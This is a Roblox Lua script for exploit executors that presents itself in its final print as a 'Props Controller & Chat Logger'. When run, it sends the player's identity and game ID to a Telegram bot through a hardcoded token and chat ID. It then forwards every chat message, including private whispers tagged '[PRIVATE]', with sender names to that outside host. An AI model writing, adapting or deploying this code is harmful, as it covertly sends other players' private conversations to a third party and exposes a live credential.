local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName

local botToken = "8896951312:AAExDFPex9etwJ0soNbPRuTeUuyTkradOQY"
local chatId = "7227168665"
local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

local requestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)

local function sendTelegram(text)
    if not requestFunc then return end
    
    local data = {
        chat_id = chatId,
        text = text,
        parse_mode = "Markdown"
    }
    
    pcall(function()
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

local startupMessage = "🔔 *Script Executed & Chat Logger Started!*\n\n👤 Username: `" .. playerName .. "`\n🏷️ Display Name: `" .. displayName .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`"
sendTelegram(startupMessage)

local function setupChannelLogging(channel)
    channel.MessageReceived:Connect(function(message)
        local sender = message.TextSource and message.TextSource.Name or "System"
        local chatText = message.Text
        local channelName = channel.Name
        
        local prefix = "💬"
        if channelName:find("RBXWhisper") then
            prefix = "🔒 [PRIVATE]"
        end

        local formattedMessage = string.format("%s *[%s]* `%s`: %s", prefix, playerName, sender, chatText)
        sendTelegram(formattedMessage)
    end)
end

-- Monitor existing and new channels (General and Private Whispers)
task.spawn(function()
    local textChannels = TextChatService:WaitForChild("TextChannels")

    -- Log existing channels
    for _, channel in ipairs(textChannels:GetChildren()) do
        if channel:IsA("TextChannel") then
            setupChannelLogging(channel)
        end
    end

    -- Log new channels (like private whispers created after execution)
    textChannels.ChildAdded:Connect(function(channel)
        if channel:IsA("TextChannel") then
            setupChannelLogging(channel)
        end
    end)
end)

print("Props Controller & Chat Logger (Private Chat Support) berhasil dijalankan oleh: " .. playerName)
